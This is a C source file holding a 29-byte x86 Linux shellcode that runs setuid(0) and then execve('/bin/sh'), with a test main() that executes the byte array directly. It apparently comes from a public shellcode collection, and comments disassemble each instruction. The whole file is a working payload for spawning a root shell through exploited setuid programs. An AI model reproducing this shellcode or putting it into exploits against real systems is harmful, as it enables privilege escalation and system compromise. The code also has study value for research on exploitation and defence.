/* 29 byte-long setuid(0) + execve("/bin/sh",...) shellcode
   by Marcin Ulikowski <elceef@itsec.pl> */

#include <unistd.h>

char shellcode[] =
"\x31\xdb"             /* xor    %ebx,%ebx       */
"\x8d\x43\x17"         /* lea    0x17(%ebx),%eax */
"\xcd\x80"             /* int    $0x80           */
"\x53"                 /* push   %ebx            */
"\x68\x6e\x2f\x73\x68" /* push   $0x68732f6e     */
"\x68\x2f\x2f\x62\x69" /* push   $0x69622f2f     */
"\x89\xe3"             /* mov    %esp,%ebx       */
"\x50"                 /* push   %eax            */
"\x53"                 /* push   %ebx            */
"\x89\xe1"             /* mov    %esp,%ecx       */
"\x99"                 /* cltd                   */
"\xb0\x0b"             /* mov    $0xb,%al        */
"\xcd\x80";            /* int    $0x80           */

int main(void) {
  void(*f)()=(void*)shellcode;f();
  return 0;
}